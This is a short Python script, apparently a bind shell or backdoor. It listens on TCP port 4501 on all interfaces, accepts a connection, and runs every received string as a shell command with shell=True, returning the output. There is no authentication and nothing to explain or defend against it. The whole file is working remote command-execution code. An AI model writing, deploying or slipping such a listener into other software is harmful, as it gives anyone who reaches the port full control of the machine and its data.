#!/usr/bin/python
# -*- coding: utf-8 -*-


import socket
import subprocess

login = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = ''
port = 4501
login.bind((host, port))
login.listen(5)
login_client, infos_login = login.accept()
started = True

while started:
    rcv_cmd = login_client.recv(1024)
    rcv_cmd = rcv_cmd.decode()
    if rcv_cmd != "exit":
        cmd = subprocess.Popen(rcv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out = cmd.stdout.read() + cmd.stderr.read()
        login_client.send(out)
    else:
        started = False
        login.close()
        exit()
